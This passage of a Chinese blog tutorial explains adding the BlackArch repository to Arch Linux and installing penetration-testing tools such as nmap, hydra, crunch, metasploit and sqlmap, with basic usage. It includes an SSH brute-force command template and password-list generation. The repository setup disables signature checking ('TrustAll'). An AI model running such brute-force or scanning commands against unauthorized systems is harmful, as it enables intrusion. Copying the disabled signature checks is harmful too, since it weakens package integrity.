<li>你可以使用上面介绍过的 <a href="https://wiki.archlinux.org/index.php/Openbox_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">OpenBox</a> 通过配置来DIY自己的桌面环境，也可以使用 <a href="https://wiki.archlinux.org/index.php/Fluxbox_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">fluxbox</a>、<a href="https://wiki.archlinux.org/index.php/I3_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">i3wm</a> 等。详细请参见 <del><a href="https://latiao233.github.io/2019/07/30/%E5%88%A9%E7%94%A8openbox%E6%89%93%E9%80%A0%E8%87%AA%E5%B7%B1%E7%9A%84%E6%A1%8C%E9%9D%A2%E7%8E%AF%E5%A2%83/#more" target="_blank" rel="noopener noreffer">利用openbox打造自己的桌面环境-辣条的博客(链接已失效)。</a></del></li>
</ul>
<p>本期博客也将会使用自定义桌面环境进行演示。</p>
<blockquote>
<p>OpenBox+xfce4-panel</p>
</blockquote>
<h3 id="添加black-arch源">添加Black Arch源</h3>
<p>当Arch Linux基本配置完成之后，就可以开始正常使用了，但是为了安装渗透工具，需要添加一个<strong>Black Arch软件源</strong></p>
<blockquote>
<h4 id="什么是black-arch"><strong>什么是Black Arch</strong></h4>
<p>BlackArch Linux，简称BlackArch，是一份基于Arch的Linux发行版。该发行版被设计用于系统渗透测试及安全研究。BlackArch提供一张自启动运行DVD镜像，其中包含有多个轻量级窗口管理器和一千多种用于渗透测试和计算机取证分析的专用工具。该系统即可以直接从镜像启动，也可以安装在硬盘、U盘或虚拟机上。 ——摘自<a href="https://zh.wikipedia.org/zh-hans/BlackArch_Linux" target="_blank" rel="noopener noreffer">维基百科(需要科学上网)</a></p>
<p>Black Arch官网：<a href="https://blackarch.org/" target="_blank" rel="noopener noreffer">blackarch.org</a></p>
</blockquote>
<p>如上我们知道，Black Arch是一个基于Arch Linux的独立发行版，但我们不需要去安装它，我们只需要添加它的软件源就好。</p>
<p>具体操作如下:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo nano /etc/pacman.conf <span class="c1"># 编辑pacman.conf文件</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>在<code>pacman.conf</code>文件的末尾加入以下内容:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[blackarch]
</span></span><span class="line"><span class="cl">SigLevel = Optional TrustAll
</span></span><span class="line"><span class="cl">Server = https://mirrors.ustc.edu.cn/blackarch/$repo/os/$arch
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后执行:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pacman -Syyu
</span></span></code></pre></td></tr></table>
</div>
</div><p>如果没问题，就可以使用Black Arch的软件源了。</p>
<h2 id="开始安装配置常用渗透工具">开始安装、配置常用渗透工具</h2>
<h3 id="端口扫描和信息收集">端口扫描和信息收集</h3>
<h4 id="namp">Namp</h4>
<p>首先搬出<a href="https://baike.baidu.com/item/nmap/1400075?fr=aladdin" target="_blank" rel="noopener noreffer">Nmap</a>，这是一个很常用的扫描工具，可以在渗透的过程中扫描到对方的IP、端口、操作系统等情况。</p>
<h5 id="安装方法">安装方法</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pacman -S nmap
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="基本用法">基本用法</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nmap &lt;目标IP地址&gt; <span class="c1"># 简单的扫描</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo nmap -O &lt;目标IP地址&gt; <span class="c1"># 扫描目标的操作系统情况</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo nmap -sP &lt;目标IP地址&gt; <span class="c1"># ping扫描</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>更多用法可参考搜索引擎查询。</p>
<h4 id="xerosploit">xerosploit</h4>
<p>这个扫描工具比<strong>Nmap</strong>要炫酷一些，色彩也比较好看，用法也很简单，比<strong>Metasploit</strong>还简单。</p>
<h5 id="安装方法-1">安装方法</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pacman -S xerosploit
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="用法">用法</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ sudo xerosploit
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后执行<code>help</code>就可以看到软件自带的帮助文档了</p>
<h4 id="nslookup">nslookup</h4>
<p>这个命令是查看域名记录的，可以查看Cname、A等各种记录。它包含在<strong>dnsutils</strong>这个包里</p>
<h5 id="安装方法-2">安装方法</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pacman -S dnsutils
</span></span></code></pre></td></tr></table>
</div>
</div><p>安装这个包dnsutils即可。</p>
<blockquote>
<p>我也不太了解这个，所以具体怎么用请自行百度、谷歌一下吧。</p>
</blockquote>
<h4 id="nbtscan">nbtscan</h4>
<p>内网扫描工具，可以扫描IP段内是否有存活的IP，速度比nmap要快一些。但是只能用于局域网。</p>
<h5 id="安装方法-3">安装方法</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pacman -S nbtscan
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="使用方法">使用方法</h5>
<ul>
<li>基本扫描</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo nbtscan  -r  192.168.16.0/24
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>官方帮助文档</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">&#34;Human-readable service names&#34; (-h) option cannot be used without verbose (-v) option.
</span></span><span class="line"><span class="cl">Usage:
</span></span><span class="line"><span class="cl">nbtscan [-v] [-d] [-e] [-l] [-t timeout] [-b bandwidth] [-r] [-q] [-s separator] [-m retransmits] (-f filename)|(&lt;scan_range&gt;) 
</span></span><span class="line"><span class="cl">	-v		verbose output. Print all names received
</span></span><span class="line"><span class="cl">			from each host
</span></span><span class="line"><span class="cl">	-d		dump packets. Print whole packet contents.
</span></span><span class="line"><span class="cl">	-e		Format output in /etc/hosts format.
</span></span><span class="line"><span class="cl">	-l		Format output in lmhosts format.
</span></span><span class="line"><span class="cl">			Cannot be used with -v, -s or -h options.
</span></span><span class="line"><span class="cl">	-t timeout	wait timeout milliseconds for response.
</span></span><span class="line"><span class="cl">			Default 1000.
</span></span><span class="line"><span class="cl">	-b bandwidth	Output throttling. Slow down output
</span></span><span class="line"><span class="cl">			so that it uses no more that bandwidth bps.
</span></span><span class="line"><span class="cl">			Useful on slow links, so that ougoing queries
</span></span><span class="line"><span class="cl">			don&#39;t get dropped.
</span></span><span class="line"><span class="cl">	-r		use local port 137 for scans. Win95 boxes
</span></span><span class="line"><span class="cl">			respond to this only.
</span></span><span class="line"><span class="cl">			You need to be root to use this option on Unix.
</span></span><span class="line"><span class="cl">	-q		Suppress banners and error messages,
</span></span><span class="line"><span class="cl">	-s separator	Script-friendly output. Don&#39;t print
</span></span><span class="line"><span class="cl">			column and record headers, separate fields with separator.
</span></span><span class="line"><span class="cl">	-h		Print human-readable names for services.
</span></span><span class="line"><span class="cl">			Can only be used with -v option.
</span></span><span class="line"><span class="cl">	-m retransmits	Number of retransmits. Default 0.
</span></span><span class="line"><span class="cl">	-f filename	Take IP addresses to scan from file filename.
</span></span><span class="line"><span class="cl">			-f - makes nbtscan take IP addresses from stdin.
</span></span><span class="line"><span class="cl">	&lt;scan_range&gt;	what to scan. Can either be single IP
</span></span><span class="line"><span class="cl">			like 192.168.1.1 or
</span></span><span class="line"><span class="cl">			range of addresses in one of two forms: 
</span></span><span class="line"><span class="cl">			xxx.xxx.xxx.xxx/xx or xxx.xxx.xxx.xxx-xxx.
</span></span><span class="line"><span class="cl">Examples:
</span></span><span class="line"><span class="cl">	nbtscan -r 192.168.1.0/24
</span></span><span class="line"><span class="cl">		Scans the whole C-class network.
</span></span><span class="line"><span class="cl">	nbtscan 192.168.1.25-137
</span></span><span class="line"><span class="cl">		Scans a range from 192.168.1.25 to 192.168.1.137
</span></span><span class="line"><span class="cl">	nbtscan -v -s : 192.168.1.0/24
</span></span><span class="line"><span class="cl">		Scans C-class network. Prints results in script-friendly
</span></span><span class="line"><span class="cl">		format using colon as field separator.
</span></span><span class="line"><span class="cl">		Produces output like that:
</span></span><span class="line"><span class="cl">		192.168.0.1:NT_SERVER:00U
</span></span><span class="line"><span class="cl">		192.168.0.1:MY_DOMAIN:00G
</span></span><span class="line"><span class="cl">		192.168.0.1:ADMINISTRATOR:03U
</span></span><span class="line"><span class="cl">		192.168.0.2:OTHER_BOX:00U
</span></span><span class="line"><span class="cl">		...
</span></span><span class="line"><span class="cl">	nbtscan -f iplist
</span></span><span class="line"><span class="cl">		Scans IP addresses specified in file iplist.
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>这个我也不是很了解，因为平时都用nmap。</p>
</blockquote>
<h4 id="burpsuite">burpsuite</h4>
<p>抓包神器，需要安装java依赖。</p>
<h5 id="安装方法-4">安装方法</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pacman -S burpsuite
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="使用方法-1">使用方法</h5>
<p>burpsuite有图形界面，可以通过搜索引擎找到使用方法。</p>
<blockquote>
<p>图形界面的东西不好讲，图片一多博客就加载不出来了，请见谅。</p>
</blockquote>
<h3 id="暴力破解密码生成">暴力破解、密码生成</h3>
<h4 id="hydra">hydra</h4>
<p>暴力破解工具，中文名九头蛇，功能很强大。</p>
<h5 id="安装方法-5">安装方法</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pacman -S hydra
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="使用方法-2">使用方法</h5>
<ul>
<li>爆破ssh端口</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ hydra -l &lt;用户名&gt; -P &lt;密码字典.txt&gt; -v -e ns -t &lt;次数&gt; &lt;目标IP&gt; ssh
</span></span></code></pre></td></tr></table>
</div>
</div><p>具体使用方法可以通过搜索引擎查询。</p>
<h4 id="crunch">crunch</h4>
<p>强大的密码字典生成器。</p>
<h5 id="安装方法-6">安装方法</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pacman -S crunch
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="使用方法-3">使用方法</h5>
<p><strong>Crunch中的特殊字符有：</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="s1">&#39;%&#39;</span> 插入数字
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s1">&#39;@&#39;</span> 插入小写字母
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s1">&#39;,&#39;</span> 插入大写字母
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s1">&#39;^&#39;</span> 插入符号
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>Crunch中用到的命令参数有：</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">-b <span class="c1">#按大小分割字典文件，比如后跟20mib</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-c <span class="c1">#密码个数（行数），比如8000</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-d <span class="c1">#限制出现相同元素的个数（至少出现元素个数），-d 3就不会出现aabbbb之类的情况</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-e <span class="c1">#定义停止生成密码 ，比如-e abcd：到abcd停止生成密码</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-f <span class="c1">#调用密码库文件，比如-f charset.lst mixalpha-numeric 意为调用密码库 charset.lst中的 mixalpha-numeric项目字符</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-i <span class="c1">#改变输出格式</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-l <span class="c1">#与-t搭配使用</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-m <span class="c1">#与-p搭配使用</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-o <span class="c1">#保存为</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-p <span class="c1">#定义密码元素</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-q <span class="c1">#读取字典</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-r <span class="c1">#定义从某一个地方重新开始</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-s <span class="c1">#第一个密码，从xxx开始</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-t <span class="c1">#定义输出格式</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-z <span class="c1">#打包压缩，格式支持 gzip, bzip2, lzma, 7z</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>生成最小1位，最大8位，由26个小写字母为元素的所有组合:</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ crunch <span class="m">1</span> <span class="m">8</span> &gt;&gt; 1.txt
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>生成 最小为1,最大为4.由abcd为元素的所有组合:</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ crunch <span class="m">1</span> <span class="m">4</span> abcd &gt;&gt; 2.txt
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>生成以“yale”“test”为元素的所有密码组合:</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ crunch <span class="m">4</span> <span class="m">5</span> -p yale <span class="nb">test</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>还有更多的方法可以自行通过搜索引擎查找。</p>
<h3 id="漏洞利用">漏洞利用</h3>
<h4 id="metasploit">metasploit</h4>
<p>这是最重要的一个工具，没有它，内网的渗透也是无法完整进行的。</p>
<h5 id="安装方法-7">安装方法</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pacman -S metasploit
</span></span></code></pre></td></tr></table>
</div>
</div><p>安装完后执行:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo msfconsole
</span></span></code></pre></td></tr></table>
</div>
</div><p>即可。</p>
<h5 id="修复数据库问题">修复数据库问题</h5>
<p>启动msf以后是不是出现了三行报错？这是没有连接数据库导致的。</p>
<h6 id="安装postgresql">安装postgresql</h6>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pacman -S postgresql
</span></span></code></pre></td></tr></table>
</div>
</div><h6 id="配置postgresql">配置postgresql</h6>
<p>安装完后会多出来一个用户，叫做<code>postgres</code>，我们需要给它设置一个密码。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo passwd postgres
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后初始化数据库</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo su - postgres -c <span class="s2">&#34;initdb --locale en_US.UTF-8 -E UTF8 -D &#39;/var/lib/postgres/data&#39;&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>初始化完成后就可以启动数据库了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo systemctl start postgresql
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来，进入数据库用户postgres</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo su postgres
</span></span></code></pre></td></tr></table>
</div>
</div><p>执行<code>psql</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ psql
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后光标就变成了<code>postgres=#</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">postgres</span><span class="o">=</span><span class="c1">#</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>如上面这个样子。</p>
<p>接下来创建一个数据库的新用户，比如<code>msf4</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">postgres</span><span class="o">=</span><span class="c1"># CREATE USER msf4 WITH PASSWORD &#39;123456&#39;;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后创建对应的数据库</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">postgres</span><span class="o">=</span><span class="c1"># CREATE DATABASE msfdb OWNER msf4;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>将msfdb数据库的所有权限都赋予msf4</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">postgres</span><span class="o">=</span><span class="c1"># GRANT ALL PRIVILEGES ON DATABASE msfdb TO msf4;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>退出psql</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">postgres</span><span class="o">=</span><span class="c1"># \q</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>创建Linux普通用户，名称与刚才新建的数据库用户同名，如msf4</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo useradd msf4
</span></span></code></pre></td></tr></table>
</div>
</div><h6 id="通过msf连接数据库">通过msf连接数据库</h6>
<p>进入msf，链接数据库，命令为<code>db_connect用户名:密码@ip/数据库名</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5&gt; db_connect msf4:123456@127.0.0.1/msfdb
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后检查是否连接成功，如果出现类似以下内容说明成功了。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 &gt; db_status
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Connected to msf3. Connection type: postgresql. Connection name: DFz5oEX3.
</span></span></code></pre></td></tr></table>
</div>
</div><p>成功连接后，别忘了保存以及设置<code>postgresql</code>自启</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 &gt; db_save
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo systemctl <span class="nb">enable</span> postgresql
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="使用方法-4">使用方法</h5>
<p>参考<a href="/posts/%e9%9c%87%e6%83%8a16%e5%b2%81%e7%94%b7%e5%ad%90%e7%ab%9f%e7%84%b6%e5%9c%a8%e5%ae%b6%e9%87%8c%e5%81%9a%e5%87%ba%e8%bf%99%e7%a7%8d%e4%ba%8b/" rel="">这篇文章</a></p>
<p>也可通过搜索引擎找更多的教程。</p>
<h4 id="sqlmap">sqlmap</h4>
<p>强大的web注入工具，使用方法可以通过搜索引擎查到。</p>
<h5 id="安装方法-8">安装方法</h5>
<p>执行以下命令安装即可。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pacman -S sqlmap
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="dns劫持">DNS劫持</h3>
<h4 id="ettercap">ettercap</h4>
